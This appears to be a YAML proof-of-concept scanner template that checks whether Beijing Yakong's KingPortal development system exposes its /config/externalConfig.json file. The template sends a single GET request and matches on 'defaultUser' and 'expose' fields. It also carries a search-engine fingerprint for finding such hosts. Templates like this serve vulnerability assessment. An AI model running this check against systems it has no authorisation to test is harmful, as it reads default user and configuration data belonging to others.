id: poc-yaml-kingportal-externalconfig-json-info-leak
info:
  name: 北京亚控科技KingPortal开发系统 externalConfig.json 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: KingPortal开发系统
  hunter: web.title="KingPortal 开发系统客户端"
requests:
- method: GET
  path: /config/externalConfig.json
  expression: "status_code == 200 && \ncontains(body,\"\\\"defaultUser\\\"\") &&\n\
    contains(body,\"\\\"expose\\\"\") &&\ncontains(content_type,\"application/json\"\
    )\n"
variables: {}
transport: http
